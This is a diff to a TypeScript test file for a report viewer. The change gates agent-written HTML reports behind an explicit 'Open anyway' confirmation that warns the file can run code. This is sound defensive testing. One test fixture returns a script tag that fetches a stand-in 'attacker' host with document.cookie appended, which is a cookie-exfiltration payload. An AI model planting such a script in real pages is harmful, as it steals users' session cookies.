@@ -81,22 +81,28 @@ run('a readfile rejection (missing/un-merged file) yields the not-found state', 
   assert.equal(state.kind, 'not-found')
 })
 
-run('an .html report opens in the browser and is never read inline', async () => {
-  const { fs, reads, opens } = stubFs()
+run('an existing .html report probes the path and resolves to the confirm gate without opening', async () => {
+  const { fs, reads, opens } = stubFs({
+    readfile: async (path) => {
+      reads.push(path)
+      return "<script>fetch('//attacker/'+document.cookie)</script>"
+    },
+  })
   const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
-  assert.deepEqual(opens, ['/repo/reports/run-1.html'], 'opens the resolved path in the browser')
-  assert.equal(reads.length, 0, 'an html report does not call readfile')
-  assert.equal(state.kind, 'html')
+  assert.deepEqual(reads, ['/repo/reports/run-1.html'], 'probes the resolved path for existence')
+  assert.equal(opens.length, 0, 'loading an html report never opens the browser — opening is gated behind confirm')
+  assert.equal(state.kind, 'html-confirm')
 })
 
-run('an html open failure also falls back to not-found', async () => {
-  const { fs } = stubFs({
-    openHtmlFileInBrowser: async () => {
-      throw new Error('open failed')
+run('an un-merged .html report (existence probe rejects) reaches not-found, never a false opened state', async () => {
+  const { fs, opens } = stubFs({
+    readfile: async () => {
+      throw new Error('ENOENT')
     },
   })
   const state = await loadReportContent(fs, WORKSPACE, 'reports/run-1.html')
   assert.equal(state.kind, 'not-found')
+  assert.equal(opens.length, 0, 'an un-merged html report is never handed to the browser')
 })
 
 run('isHtmlReport distinguishes .html from .md (case-insensitive)', () => {
@@ -109,7 +115,7 @@ run('isHtmlReport distinguishes .html from .md (case-insensitive)', () => {
 
 function body(state: ReportViewState, pullRequestUrl?: string): string {
   return renderToStaticMarkup(
-    <ReportViewBody state={state} pullRequestUrl={pullRequestUrl} onReopenHtml={() => {}} />,
+    <ReportViewBody state={state} pullRequestUrl={pullRequestUrl} onOpenHtml={() => {}} />,
   )
 }
 
@@ -133,8 +139,16 @@ run('the not-found state without a PR renders no dead link', () => {
   assert.ok(!markup.includes('<a '), 'no anchor without a pullRequestUrl')
 })
 
-run('the html state reports the browser hand-off and offers Open again, not inline content', () => {
-  const markup = body({ kind: 'html' })
+run('the html-confirm gate warns it can run code and offers an explicit Open anyway, not inline content', () => {
+  const markup = body({ kind: 'html-confirm' })
+  assert.match(markup, /can run code/, 'the run-code risk is stated before opening')
+  assert.match(markup, /automation agent/, 'ownership of the html is attributed to the agent')
+  assert.match(markup, /Open anyway/, 'opening is an explicit confirmation, not the default')
+  assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
+})
+
+run('the html-opened state reports the browser hand-off and offers Open again', () => {
+  const markup = body({ kind: 'html-opened' })
   assert.match(markup, /opened in your browser/, 'the html hand-off is explained')
   assert.match(markup, /Open again/, 'a re-open affordance is offered')
   assert.ok(!markup.includes('markdown-rendered'), 'html is never inline-rendered as markdown')
@@ -200,6 +214,28 @@ run('the picker selection is wired to setActivePath', () => {
     viewerSource,
     /<ReportPathPicker[^>]*onSelect=\{setActivePath\}/,
     'choosing a report updates the active selection that the effect reloads on',
+  )
+})
+
+run('opening an html report is wired only through the confirm action, never the load effect', () => {
+  // The load effect must not open the browser (F1): openHtmlFileInBrowser is
+  // called solely from the openHtml confirm handler, which the body invokes via
+  // onOpenHtml. Assert the effect body holds no open call and the handler does.
+  const effect = viewerSource.match(/useEffect\(\(\) => \{[\s\S]*?\}, \[activePath, workspaceRoot\]\)/)
+  assert.ok(effect, 'the load effect exists')
+  assert.ok(
+    !effect![0].includes('openHtmlFileInBrowser'),
+    'the load effect never opens the browser — a single View-report click does not run agent html',
+  )
+  assert.match(
+    viewerSource,
+    /const openHtml = useCallback\(\(\) => \{[\s\S]*?openHtmlFileInBrowser\(joinFilePath\(workspaceRoot, activePath\)\)/,
+    'the only open call lives in the explicit openHtml confirm handler',
+  )
+  assert.match(
+    viewerSource,
+    /<ReportViewBody[^>]*onOpenHtml=\{openHtml\}/,
+    'the confirm gate and re-open both route through the gated openHtml handler',
   )
 })
 
